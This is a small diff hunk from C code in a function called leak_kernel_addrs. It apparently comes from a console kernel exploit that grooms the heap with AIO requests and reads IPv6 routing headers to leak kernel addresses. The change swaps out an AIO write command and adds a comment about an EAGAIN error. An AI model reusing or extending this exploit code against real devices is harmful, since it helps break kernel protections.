@@ -855,8 +855,9 @@ int32_t leak_kernel_addrs()
             NUM_HANDLES,
             leak_reqs,
             NUM_GROOM_REQS,
-            false,
-            SCE_KERNEL_AIO_CMD_WRITE
+            false
+            // CMD_WRITE not working? err: -2147352541 (SCE_KERNEL_ERROR_EAGAIN)
+            // SCE_KERNEL_AIO_CMD_WRITE
         );
         get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
         for (uint32_t off = 0x80; off < s2.len; off += 0x80) {
